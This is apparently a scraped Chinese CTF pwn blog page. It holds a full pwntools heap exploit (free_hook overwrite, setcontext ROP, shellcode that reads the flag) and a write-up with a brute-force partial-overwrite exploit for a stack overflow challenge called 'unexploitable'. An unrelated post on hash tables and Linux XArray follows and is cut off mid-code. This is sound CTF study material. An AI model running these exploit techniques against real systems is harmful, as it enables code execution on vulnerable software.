class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chuj.top&#x27;</span>, <span class="string">&#x27;53178&#x27;</span>)</span><br><span class="line"></span><br><span class="line">heapbase = <span class="literal">None</span></span><br><span class="line">libc_os = <span class="keyword">lambda</span> x : libc.address + x</span><br><span class="line">heap_os = <span class="keyword">lambda</span> x : heapbase + x</span><br><span class="line"></span><br><span class="line">p_sl = <span class="keyword">lambda</span> x, y : p.sendlineafter(y, <span class="built_in">str</span>(x) <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(x, <span class="built_in">bytes</span>) <span class="keyword">else</span> x)</span><br><span class="line">p_s  = <span class="keyword">lambda</span> x, y : p.sendafter(y, <span class="built_in">str</span>(x) <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(x, <span class="built_in">bytes</span>) <span class="keyword">else</span> x)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment"># gdb.attach(p,&quot;b* 0x407743\n&quot;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">c</span>):</span></span><br><span class="line">    p_sl(c,<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p_sl(index,<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p_sl(size,<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p_sl(index,<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p_sl(content,<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p_sl(index,<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p_sl(index,<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">addr</span>):</span></span><br><span class="line">    con = <span class="built_in">bin</span>(addr).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> con[::-<span class="number">1</span>].ljust(<span class="number">64</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeb</span>(<span class="params">addr</span>):</span></span><br><span class="line">    con = <span class="built_in">bin</span>(addr).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> con[::-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    add(i,<span class="number">0xb8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0xb8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf</span>,<span class="number">0xb8</span>)</span><br><span class="line">show(<span class="number">0xf</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebd50</span></span><br><span class="line">log.success(<span class="string">&quot;libc.address: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heapbase = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x620</span></span><br><span class="line">log.success(<span class="string">&#x27;heapbase: &#x27;</span> + <span class="built_in">hex</span>(heapbase))</span><br><span class="line"></span><br><span class="line">free_hook = libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">setcontext=libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span></span><br><span class="line">open_libc = libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">write_libc = libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">read_libc = libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line">pop_rax_ret = libc.address + <span class="number">0x000000000001b500</span></span><br><span class="line">pop_rdi_ret = libc.address + <span class="number">0x000000000002164f</span></span><br><span class="line">pop_rsi_ret = libc.address + <span class="number">0x0000000000023a6a</span></span><br><span class="line">pop_rdx_ret = libc.address + <span class="number">0x0000000000001b96</span></span><br><span class="line">ret = libc.address + <span class="number">0x00000000000008aa</span></span><br><span class="line">syscall_ret = libc.address + <span class="number">0x00000000000d2625</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;free_hook: &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&quot;setcontext: &quot;</span>+<span class="built_in">hex</span>(setcontext))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">payload = change(<span class="number">0x4000000</span>)*<span class="number">22</span> + change(<span class="number">0x170</span>)</span><br><span class="line">edit(<span class="number">11</span>,payload)</span><br><span class="line"></span><br><span class="line">heap_addr = heapbase + <span class="number">0x9d0</span></span><br><span class="line">payload = change(<span class="number">0</span>)+change(<span class="number">0x171</span>)+change(heap_addr+<span class="number">0x18</span>)+change(heap_addr+<span class="number">0x20</span>)+change(heap_addr+<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">10</span>,payload)</span><br><span class="line">delete(<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0xb8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">14</span>,<span class="number">0xb8</span>)</span><br><span class="line">delete(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">rop_start = heapbase + <span class="number">0xed8</span></span><br><span class="line">payload = change(<span class="number">0</span>)+change(<span class="number">0xa0</span>)+change(free_hook)</span><br><span class="line">edit(<span class="number">0xa</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = change(setcontext)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0xb8</span>)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0xb8</span>)</span><br><span class="line">edit(<span class="number">14</span>,payload)</span><br><span class="line"></span><br><span class="line">flag_addr = heapbase + <span class="number">0xe30</span></span><br><span class="line">shellcode_addr = heapbase + <span class="number">0xf30</span></span><br><span class="line">shellcode =  change(<span class="number">0x000003bfff314890</span>) + change(<span class="number">0x0000271005c03148</span>) + change(<span class="number">0x489090909090050f</span>)</span><br><span class="line">shellcode += change(<span class="number">0xe389489090909090</span>) + change(<span class="number">0x00000100eb814890</span>) + change(<span class="number">0xdf894800000002b8</span>) + change(<span class="number">0x050fd23148f63148</span>)</span><br><span class="line">shellcode += change(<span class="number">0x00000000b8909090</span>) + change(<span class="number">0x00000003bf909090</span>) + change(<span class="number">0x00000030bade8948</span>) + change(<span class="number">0x050f909090909090</span>)</span><br><span class="line">shellcode += change(<span class="number">0x00000001b8909090</span>) + change(<span class="number">0x00000001bf909090</span>) + change(<span class="number">0x00000030bade8948</span>) + change(<span class="number">0x050f909090909090</span>)</span><br><span class="line"></span><br><span class="line">payload = changeb(<span class="number">46</span>)+changeb(<span class="number">47</span>)+changeb(<span class="number">102</span>)+changeb(<span class="number">108</span>)+changeb(<span class="number">97</span>)+changeb(<span class="number">103</span>)+changeb(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += change(<span class="number">0</span>)*(<span class="number">20</span>-<span class="number">1</span>)</span><br><span class="line">payload += change(rop_start) + change(ret)</span><br><span class="line">payload += change(pop_rax_ret) + change(<span class="number">10</span>) + change(pop_rdi_ret) + change(heapbase) + change(pop_rsi_ret) + change(<span class="number">0x7000</span>) + change(pop_rdx_ret) + change(<span class="number">7</span>) + change(syscall_ret)</span><br><span class="line">payload += change(shellcode_addr) </span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;payload len: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x200</span>)</span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="unexploitable"><a href="#unexploitable" class="headerlink" title="unexploitable"></a>unexploitable</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1<span class="number">.6</span>)</span> stable release version 2.27</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unexploitable: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">5</span>d66afeabecb7b7190cfbdbc4bb6b5846c896e2a, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，NX，PIE</li>
</ul>
<p><strong>入侵思路</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">pwn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x30000</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只有一个栈溢出，没法泄露，没有后门</p>
<p>先进行调试，断点到 <code>pwn</code> 返回之前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7ffc641e9d38</span> —▸ <span class="number">0x564dcdc0070a</span> ◂— add    byte ptr [rax - <span class="number">0x7b</span>], cl</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7ffc641e9d40</span> —▸ <span class="number">0x564dcdc00810</span> ◂— push   r15</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7ffc641e9d48</span> —▸ <span class="number">0x7f535f4dec87</span> (__libc_start_main+<span class="number">231</span>) ◂— mov    edi, eax</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7ffc641e9d50</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7ffc641e9d58</span> —▸ <span class="number">0x7ffc641e9e28</span> —▸ <span class="number">0x7ffc641ea270</span> ◂— <span class="string">&#x27;./unexploitable&#x27;</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7ffc641e9d60</span> ◂— <span class="number">0x10000c000</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7ffc641e9d68</span> —▸ <span class="number">0x564dcdc007f1</span> ◂— push   rbp</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7ffc641e9d70</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>我们唯一的机会就是爆破 <code>__libc_start_main</code> 为 <code>one_gadget</code></li>
<li>但 <code>__libc_start_main</code> 前面还有两个地址，我们不能覆盖</li>
</ul>
<p>有一个方法可以不破坏栈，并且修改 <code>__libc_start_main</code>：</p>
<ul>
<li>利用 <code>pwn</code> 中的溢出覆盖 <code>pwn</code> 的返回地址为 <code>pwn</code>，这样就相当于 <code>pop</code> 掉了一个地址</li>
<li>重复上述操作，直到可以覆盖 <code>__libc_start_main</code></li>
<li>覆盖最后 <code>4*4 bit</code>，最后 <code>3*4 bit</code> 位恒定，每次都有 1/16 的概率可以命中</li>
<li>覆盖 <code>__libc_start_main</code> 的 <code>3*4 bit</code>，每次都有 1/4096 的概率可以命中</li>
</ul>
<p>八字硬点还是可以拿到 flag 的</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> pause</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./unexploitable&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b* \n&quot;)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x7F0)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./unexploitable&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b* \n&quot;)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x7F0)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">up_gadgets = [<span class="number">0x1e92a5</span>,<span class="number">0x1e9302</span>,<span class="number">0x2a42fc</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> local:</span><br><span class="line">            p = process(challenge)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = remote(<span class="string">&#x27;chuj.top&#x27;</span>, <span class="string">&#x27;53178&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        payload  = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">        payload += p16(<span class="number">0x07D0</span>)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        payload  = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">        <span class="comment">#payload += p8(0xa5) + p8(0x92) + p8(0x1e)</span></span><br><span class="line">        <span class="comment">#payload += p8(0x02) + p8(0x93) + p8(0x1e)</span></span><br><span class="line">        payload += p8(<span class="number">0xfc</span>) + p8(<span class="number">0x42</span>) + p8(<span class="number">0x2a</span>)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        <span class="comment">#debug()</span></span><br><span class="line">        sleep(<span class="number">0.001</span>)</span><br><span class="line">        p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        flag = p.recv()</span><br><span class="line">        success(<span class="string">&quot;flag &gt;&gt; &quot;</span>+flag)</span><br><span class="line">        p.interactive()</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span> Exception: </span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/03/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E6%95%A3%E5%88%97%E8%A1%A8&XArray/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/03/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E6%95%A3%E5%88%97%E8%A1%A8&XArray/" class="post-title-link" itemprop="url">数据结构：散列表&XArray</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-11-03 15:40:12 / Modified: 15:41:48" itemprop="dateCreated datePublished" datetime="2022-11-03T15:40:12+08:00">2022-11-03</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>3.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="散列表"><a href="#散列表" class="headerlink" title="散列表"></a>散列表</h2><p>散列表（Hash Table，也叫哈希表），是根据关键码值（Key，Value）直接进行访问的数据结构</p>
<ul>
<li>通过把关键码值映射到表中一个位置来访问记录，以加快查找的速度</li>
<li>这个映射函数叫做哈希函数（散列函数），存放记录的数组叫做散列表</li>
</ul>
<p>散列表的基本思想就是“链表的数组”：</p>
<img src="/2022/11/03/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E6%95%A3%E5%88%97%E8%A1%A8&XArray/1667454792774-1667456445567.png" class width="1667454792774"> 
<p>运用流程如下：</p>
<ul>
<li>利用 Hash 算法来来把一个不同长度的特征值转化成杂乱的128位的编码</li>
<li>将目标编码转变为数组下标</li>
<li>在散列表中索引对应的链表，然后插链</li>
</ul>
<p>相比于正常的链表，散列表在插链之前先对链表的各个节点进行了“分组”（依赖哈希函数的无规律分组），在之后的查找/脱链过程中，程序只需要遍历对应的链表，而不是从头开始把所有的节点都遍历一遍</p>
<p>将目标编码转变为数组下标的方法就是散列法，常见的散列法如下：</p>
<ul>
<li>除法散列法：<ul>
<li>对目标编码进行取模</li>
<li><code>index = value % 16</code></li>
</ul>
</li>
<li>平方散列法：<ul>
<li>乘法的运算要比除法来得省时，所以把除法换成乘法和一个位移操作</li>
<li><code>index = (value * value) &gt;&gt; 28</code>（<code>value</code>的类型为<code>int</code>，乘法的结果不会超过32位）</li>
</ul>
</li>
<li>斐波那契（Fibonacci）散列法：<ul>
<li>找出一个理想的乘数，而不是拿 <code>value</code> 本身当作乘数</li>
<li><code>index = (value * 2654435769) &gt;&gt; 28</code></li>
</ul>
</li>
</ul>
<p>散列表的优缺点如下：</p>
<ul>
<li>优点：<ul>
<li>不论散列表中有多少数据，查找/插入/删除只需要接近常量的时间即 0(1) 的时间级（实际上只需要几条机器指令）</li>
<li>散列表的编程实现也相对容易</li>
</ul>
</li>
<li>缺点：<ul>
<li>散列表是基于数组的，数组创建后难于扩展，某些哈希表被基本填满时，性能下降得非常严重</li>
<li>程序员必须要清楚表中将要存储多少数据，或者准备好定期地把数据转移到更大的哈希表中，这是个费时的过程</li>
</ul>
</li>
</ul>
<h2 id="XArray"><a href="#XArray" class="headerlink" title="XArray"></a>XArray</h2><p>XArray 是一种抽象的数据类型，其行为类似于一个非常大的指针数组，它满足了与散列或常规可调整大小的数组相同的许多需求</p>
<ul>
<li>与散列表 (Hash Table) 相比：它允许您以高效缓存的方式明智地转到下一个或上一个条目</li>
<li>与可调整大小的阵列 (Array Data Structure，多维数组) 相比：无需为了扩展阵列而复制数据或更改 MMU 映射 </li>
<li>与双向链接列表相比：它具有更高的内存效率，可并行性和缓存友好性</li>
<li>它利用 RCU 来执行查找而无需锁定</li>
</ul>
<p>XArray 其实是根据基数树 Radix Tree 修改而来的：保持基数树的数据结构不变，将结构更改为数组</p>
<p>先对比一下 XArray 和 Radix Tree 的创建函数：</p>
<ul>
<li>XArray：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">xas_create</span><span class="params">(struct xa_state *xas)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xarray</span> *<span class="title">xa</span> =</span> xas-&gt;xa;</span><br><span class="line">	<span class="keyword">void</span> *entry;</span><br><span class="line">	<span class="keyword">void</span> __rcu **slot;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xa_node</span> *<span class="title">node</span> =</span> xas-&gt;xa_node;</span><br><span class="line">	<span class="keyword">int</span> shift;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> order = xas-&gt;xa_shift;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (xas_top(node)) &#123; <span class="comment">/* 获取Root节点 */</span></span><br><span class="line">		entry = xa_head_locked(xa);</span><br><span class="line">		xas-&gt;xa_node = <span class="literal">NULL</span>;</span><br><span class="line">		shift = xas_expand(xas, entry); <span class="comment">/* 实现XArray纵向的生长 */</span></span><br><span class="line">		<span class="keyword">if</span> (shift &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">		entry = xa_head_locked(xa);</span><br><span class="line">		slot = &amp;xa-&gt;xa_head;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (xas_error(xas)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (node) &#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> offset = xas-&gt;xa_offset;</span><br><span class="line"></span><br><span class="line">		shift = node-&gt;shift;</span><br><span class="line">		entry = xa_entry_locked(xa, node, offset);</span><br><span class="line">		slot = &amp;node-&gt;slots[offset];</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		shift = <span class="number">0</span>;</span><br><span class="line">		entry = xa_head_locked(xa);</span><br><span class="line">		slot = &amp;xa-&gt;xa_head;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (shift &gt; order) 